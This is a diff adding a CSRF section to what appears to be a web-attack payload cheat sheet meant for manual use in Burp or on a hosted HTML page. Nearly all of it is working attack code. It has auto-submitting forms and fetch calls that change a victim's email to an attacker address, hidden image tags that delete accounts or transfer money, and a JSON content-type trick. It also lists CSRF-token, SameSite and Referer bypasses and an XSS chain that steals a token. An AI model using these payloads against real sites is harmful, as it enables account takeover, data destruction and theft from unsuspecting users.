@@ -119,3 +119,125 @@ fetch('/api/get-token').then(r=>r.text()).then(token=>{
   });
 });
 </script>
+
+# ============================================================
+# CSRF — Cross-Site Request Forgery
+# Bypass techniques: token bypass, SameSite, content-type
+# Use: Manual crafting in Burp, custom HTML page
+# ============================================================
+
+# ---- Basic HTML CSRF ----
+<form action="https://target.com/api/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="submit" value="Submit">
+</form>
+<script>document.forms[0].submit();</script>
+
+# ---- GET-Based CSRF ----
+<img src="https://target.com/api/delete-account?confirm=yes">
+<img src="https://target.com/api/change-email?email=attacker@evil.com">
+<script>new Image().src="https://target.com/api/transfer?amount=1000&to=attacker"</script>
+<a href="https://target.com/api/change-email?email=attacker@evil.com">Click me</a>
+
+# ---- Auto-Submit via JS ----
+<script>
+fetch('https://target.com/api/change-email', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'email=attacker@evil.com'
+});
+</script>
+
+# ---- JSON CSRF (requires content-type bypass) ----
+# Option 1: form with text/plain (Flash-era trick)
+<form action="https://target.com/api/update" method="POST" enctype="text/plain">
+  <input name='{"email":"attacker@evil.com","z":"' value='"}'>
+</form>
+
+# Option 2: fetch with no-cors
+<script>
+fetch('https://target.com/api/update', {
+  method: 'POST',
+  credentials: 'include',
+  mode: 'no-cors',
+  headers: {'Content-Type': 'text/plain'},
+  body: '{"email":"attacker@evil.com"}'
+});
+</script>
+
+# ---- CSRF Token Bypass Techniques ----
+
+# 1. Remove token entirely — server may not validate if missing
+POST /api/change-email
+email=attacker@evil.com
+# (no csrf_token field)
+
+# 2. Use another user's valid token
+csrf_token=VICTIM_GRABBED_TOKEN_HERE
+
+# 3. Change token to empty
+csrf_token=
+
+# 4. Predictable/guessable token
+csrf_token=1234567890
+csrf_token=admin
+csrf_token=0
+
+# 5. Change request method GET → POST or POST → GET
+# If token only checked on POST, switch to GET
+
+# 6. Content-Type confusion
+# Change: Content-Type: application/json
+# To: Content-Type: application/x-www-form-urlencoded
+# or: Content-Type: multipart/form-data
+
+# 7. Same value for token and cookie (Double Submit bypass)
+# If app uses double-submit cookie pattern and you can set cookies via XSS/subdomain:
+# Set cookie: csrf=attacker_value
+# Send: csrf_token=attacker_value
+
+# ---- SameSite Bypass ----
+
+# If SameSite=Lax:
+# Use GET for state-changing endpoints (if server allows)
+<img src="https://target.com/api/delete?id=1">
+# Or: top-level navigation within 2 min of page load
+<a href="https://target.com/api/change-email?email=attacker@evil.com">Click</a>
+
+# If SameSite=None without Secure:
+# Normal CSRF works cross-origin
+
+# Subdomain CSRF (if subdomain can set cookies for parent):
+# Exploit XSS on sub.target.com to overwrite csrf cookie on target.com
+
+# ---- Referer-Based Protection Bypass ----
+# 1. Remove Referer header entirely:
+<meta name="referrer" content="no-referrer">
+<img src="https://target.com/csrf-action" referrerpolicy="no-referrer">
+
+# 2. Include target in Referer URL path:
+# Serve attack from: https://evil.com?target.com
+# Referer: https://evil.com?target.com/path
+
+# 3. Include target in Referer as subdomain:
+# Serve from: https://target.com.evil.com
+
+# ---- Multipart CSRF ----
+<form action="https://target.com/api/upload" method="POST" enctype="multipart/form-data">
+  <input type="hidden" name="action" value="delete">
+  <input type="hidden" name="id" value="123">
+  <input type="submit">
+</form>
+
+# ---- CSRF via XSS Chain ----
+# If there's stored XSS on target.com, use it to steal token and submit:
+<script>
+fetch('/api/get-token').then(r=>r.text()).then(token=>{
+  fetch('/api/change-email', {
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'email=attacker@evil.com&csrf_token='+token
+  });
+});
+</script>
